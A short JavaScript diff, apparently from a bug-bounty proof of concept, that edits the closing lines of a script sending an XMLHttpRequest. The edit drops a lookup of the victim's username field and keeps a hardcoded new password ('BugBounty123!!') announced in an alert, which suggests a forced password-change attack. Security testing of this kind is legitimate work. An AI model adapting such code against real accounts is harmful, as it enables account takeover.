@@ -47,7 +47,6 @@ xhr.onerror = function () {
 };
 
 xhr.send();
-const username2 =  doc.querySelector('input[id="username"]')?.value || null;
-const password2= "BugBounty123!!";
-alert("New password has changed for username:"+username2+" to password:"+password2);         
+const password= "BugBounty123!!";
+alert("Password has changed to "+password);         
 
